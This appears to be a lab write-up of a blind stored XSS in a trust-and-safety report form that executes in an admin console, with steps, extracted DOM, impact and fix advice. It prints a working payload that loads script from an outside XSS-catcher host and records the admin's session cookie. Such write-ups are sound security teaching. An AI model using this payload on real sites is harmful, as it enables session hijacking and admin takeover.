Lab name : Blind XSS - Safety & Trust Center
# Title
Blind Cross-Site Scripting (XSS) via Trust & Safety Report Form Leading to Admin Session Compromise

# Vulnerability Type
Blind Cross-Site Scripting (XSS) / Stored XSS

# Summary
The application is vulnerable to Blind Cross-Site Scripting (XSS) through the public "Submit a trust & safety report" form. The application fails to properly sanitize or encode user-supplied input before storing it in the database. When a trust and safety agent or administrator logs into the backend console and views the submitted case (`/admin/view.php?id=1`), the malicious JavaScript payload executes automatically in the administrator's browser context. This allows an attacker to execute arbitrary code within the privileged administrator session.

# Vulnerable Endpoint
- `https://trustdesk.pwnedbox.site/report.php` (Injection Point)
- `https://trustdesk.pwnedbox.site/admin/view.php?id=1` (Execution Point)
  
# Vulnerable Parameter
Based on the DOM analysis, the following parameters are vulnerable and reflect the payload unsanitized in the admin panel:
- `Report title` (Reflected in the `<h1>` tag)
- `Reported URL` (Reflected in the "Target" field)
- `Username / profile` (Reflected in the "Target" field and "Reporter" field)
- `What happened?` (Reflected in the "Description" section)
- `Evidence & context` (Reflected in the "Evidence / context" section)
- `Your name` (Reflected in the "Reporter" field)
- 
# Steps to Reproduce
1. Navigate to the report submission form: `https://trustdesk.pwnedbox.site/report.php`
2. In the **"Report title"**, **"Reported URL"**, **"Username / profile"**, **"What happened?"**, **"Evidence & context"**, and **"Your name"** fields, insert the following payload:  
    `"><img/src/onerror=import('//xss.report/c/cyberbro')>`
3. Fill in the remaining required fields (Email address, Report type, Severity) with valid data and click **"Submit report"**.
4. Wait for the trust and safety agent/administrator to log in and view the submitted case in the admin console.
5. Observe the out-of-band interaction on `xss.report`. The tool successfully captures the execution, recording the admin's `PHPSESSID` cookie, the URI (`/admin/view.php?id=1`), and the Referrer (`/admin/index.php`), confirming the payload executed in the admin's browser.

# Payload Used 
`"><img/src/onerror=import('//xss.report/c/cyberbro')>`

# Proof of Concept
<img width="1920" height="1040" alt="1" src="https://github.com/user-attachments/assets/d76c9845-3d43-4fca-a4e5-f9c232b7f207" />
<img width="1920" height="1039" alt="3" src="https://github.com/user-attachments/assets/601e3972-c013-48b3-a7d9-172337992fbb" />
<img width="1920" height="1040" alt="4" src="https://github.com/user-attachments/assets/b9407c4a-7eff-42bb-8b14-8ba678650ca6" />
<img width="1920" height="1039" alt="5" src="https://github.com/user-attachments/assets/a323e4b1-3b20-494f-a06f-530ccd5046c7" />
<img width="1920" height="1039" alt="6" src="https://github.com/user-attachments/assets/d706db08-83b2-4398-976f-0ad07ae49e84" />

# Extracted DOM
```js
<!-- PASTE YOUR DOM HERE -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Case TD-4481BE73 · TrustDesk</title>
</head>
<body class="admin-shell">
    <!-- ... header ... -->
    <main class="case-admin">
        <div class="case-admin-head">
            <div>
                <span class="eyebrow">TD-4481BE73</span>
                <!-- REFLECTION 1: Report title -->
                <h1>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></h1>
            </div>
            <span class="status status-new">new</span>
        </div>
        <div class="admin-columns">
            <section class="case-card">
                <h3>Report details</h3>
                <dl>
                    <dt>Type</dt><dd>User</dd>
                    <dt>Severity</dt><dd>Low</dd>
                    <!-- REFLECTION 2: Your name & Email in Reporter -->
                    <dt>Reporter</dt><dd>'"&gt;&lt;img/src/onerror=import('//xss.report/c/cyberbro')&gt; · hello@gmail.com</dd>
                    <!-- REFLECTION 3 & 4: Reported URL & Username in Target -->
                    <dt>Target</dt><dd>@'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"> · '"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></dd>
                    <dt>Submitted</dt><dd>2026-10-22 04:49:50</dd>
                </dl>
                <hr>
                <!-- REFLECTION 5: What happened -->
                <h3>Description</h3>
                <p>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></p>
                <!-- REFLECTION 6: Evidence & context -->
                <h3>Evidence / context</h3>
                <p>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></p>
            </section>
            <!-- ... aside forms ... -->
        </div>
    </main>
    <!-- ... scripts ... -->
</body>
</html>
```

# Impact
Because this is a Blind XSS, the payload executes in the browser of an internal user (specifically, the site administrator) when they view the infected inquiries. This is a critical vulnerability. An attacker can perform the following actions:

- **Session Hijacking & Admin Account Takeover:** Steal the administrator's session cookie (`PHPSESSID`), allowing the attacker to completely bypass authentication and take over the admin account.
- **Privileged Actions:** The script can make authenticated requests on behalf of the administrator to perform sensitive actions, such as altering site content, viewing sensitive customer data, or creating new admin users.
- **Exfiltration of Sensitive Data:** The payload can read the contents of the admin dashboard or internal pages and send them to an attacker-controlled server.

# Recommendation for fix
1. **Output Encoding:** Apply context-aware HTML entity encoding to **all** user-supplied data before rendering it in **any** interface, including backend administrative panels (e.g., convert `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`). The backend must be treated with the same security rigor as the public-facing frontend.
2. **Input Sanitization:** Use a reputable HTML sanitization library (such as DOMPurify) to strip dangerous tags and attributes from user input before storing it in the database. If rich text is not required, strip all HTML tags entirely.
3. **Content Security Policy (CSP):** Deploy a strict CSP header on the administrative backend to prevent the execution of inline scripts and unauthorized external scripts as a defense-in-depth measure.
4. **Secure Cookies:** Ensure all session cookies (like `PHPSESSID`) use the `HttpOnly` and `Secure` flags to prevent JavaScript from accessing them, mitigating the risk of session hijacking even if an XSS occurs.
